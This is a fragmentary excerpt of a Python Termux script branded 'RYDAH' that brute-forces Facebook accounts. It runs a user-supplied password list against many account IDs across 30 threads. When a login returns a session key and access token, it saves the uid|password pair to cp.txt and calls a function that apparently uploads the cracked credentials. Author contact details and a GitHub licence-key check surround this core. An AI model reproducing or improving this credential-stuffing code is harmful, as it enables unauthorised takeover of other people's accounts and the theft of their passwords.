...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://wa.me/+2349017624430?text="+ tks])
...
def notice():
	...
	runtxt("\033[0;92m ADMIN FACEBOOK >> NIL")
	subprocess.check_output(["am", "start", "https://wa.me/+2349017624430?text="+ tks])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Rydah300/RydahFast/blob/main/z.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            RYDAH TERMUX
     \033[1;91m➣ \033[1;92mFACEBOOK   :            NIL
     \033[1;93m➣ \033[1;92mWHATSAPP   :            +2349017624430
     \033[1;96m➣ \033[1;92mGITHUB     :            RYDII
...
#				exit()
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR RYDAH  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:RYDAH ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[RYDAH TM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [RYDAH TM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
